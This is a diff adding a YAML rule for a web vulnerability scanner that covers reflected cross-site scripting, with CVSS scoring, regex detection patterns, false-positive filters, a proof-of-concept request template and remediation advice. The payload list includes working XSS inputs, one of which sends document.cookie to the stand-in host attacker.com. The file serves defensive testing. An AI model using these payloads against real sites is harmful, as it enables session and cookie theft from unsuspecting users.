@@ -1,0 +1,106 @@
+id: "rule-xss-reflected"
+name: "Cross-Site Scripting (Reflected)"
+name_cn: "反射型跨站脚本"
+description: "用户输入被直接反射到响应页面未转义，导致攻击者可注入恶意脚本在受害者浏览器执行"
+
+owasp_category: "A03-injection"
+owasp_subcategory: "XSS"
+cwe_id: "CWE-79"
+
+cvss:
+  vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"
+  base_score: 9.3
+  severity: "critical"
+
+detection:
+  methods: ["DAST"]
+  dast_signals:
+    high_specificity:
+      - type: "event_handler_value"
+        pattern: "on(error|load|click|mouseover|focus)=.*(alert|eval|document\\.cookie|window\\.open|location\\.href|innerHTML|document\\.write)"
+        confidence: 0.95
+      - type: "javascript_protocol"
+        pattern: "javascript:.*(alert|eval|cookie|fetch|XMLHttpRequest)"
+        confidence: 0.95
+    medium_specificity:
+      - type: "script_block"
+        pattern: "<script>.*(document\\.cookie|eval\\(|window\\.open|location\\.href|innerHTML)"
+        confidence: 0.75
+      - type: "tag_injection"
+        pattern: "<(img|svg|body|iframe|input).*(onerror|onload|onclick)="
+        confidence: 0.70
+    low_specificity:
+      - type: "parameter_reflection"
+        pattern: "input_reflected_in_response_without_encoding"
+        confidence: 0.30
+  multi_layer:
+    enabled: true
+    min_signals: 2
+    high_specificity_skips_min: true
+  false_positive_filters:
+    - filter: "content_validation"
+      condition: "payload_not_reflected_in_response"
+      action: "discard"
+    - filter: "context_aware"
+      condition: "reflected_inside_textarea_or_script_with_encoding"
+      action: "downgrade"
+      target_confidence: "low"
+
+poc:
+  enabled: true
+  request_template: |
+    GET {{url}}?{{param}}={{payload}} HTTP/1.1
+    Host: {{host}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Connection: close
+  payloads:
+    - name: "basic_alert"
+      value: "<script>alert(1)</script>"
+      description: "基础 script 标签"
+      risk: "low"
+    - name: "img_onerror"
+      value: "<img src=x onerror=alert(document.cookie)>"
+      description: "img 标签 onerror 事件窃取 Cookie"
+      risk: "medium"
+    - name: "svg_onload"
+      value: "<svg onload=alert(1)>"
+      description: "SVG onload 事件"
+      risk: "low"
+    - name: "javascript_protocol"
+      value: "javascript:alert(document.cookie)"
+      description: "javascript 协议"
+      risk: "medium"
+    - name: "polyglot"
+      value: "\"><img src=x onerror=alert(1)>"
+      description: "标签闭合 + 事件注入"
+      risk: "medium"
+    - name: "cookie_steal"
+      value: "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
+      description: "Cookie 外传 PoC"
+      risk: "high"
+  verification:
+    - type: "payload_reflected"
+      description: "检查 payload 是否原样出现在响应中"
+    - type: "context_check"
+      description: "确认 payload 不在编码上下文中（如 HTML entity 编码）"
+    - type: "execution_check"
+      description: "使用浏览器渲染验证脚本是否实际执行（IAST）"
+
+remediation:
+  priority: "P0"
+  summary: "对所有用户输入做输出编码，使用 CSP 限制脚本执行"
+  details:
+    - "输出到 HTML 时使用实体编码（< > & \" ' → &lt; &gt; &amp; &quot; &#39;）"
+    - "输出到 JS 上下文时使用 Unicode 转义"
+    - "配置严格的 Content-Security-Policy，禁止内联脚本和 eval"
+    - "对富文本使用白名单 HTML 净化库（DOMPurify、HTMLPurifier）"
+    - "设置 HttpOnly + Secure + SameSite Cookie 属性"
+  references:
+    - "https://owasp.org/Top10/A03_2021-Injection/"
+    - "https://cwe.mitre.org/data/definitions/79.html"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+
+knowledge_source:
+  file: "知识库/xss-test.md"
+  methodology: "src-value-hunting.md §3 XSS 矩阵：反射 + 存储"
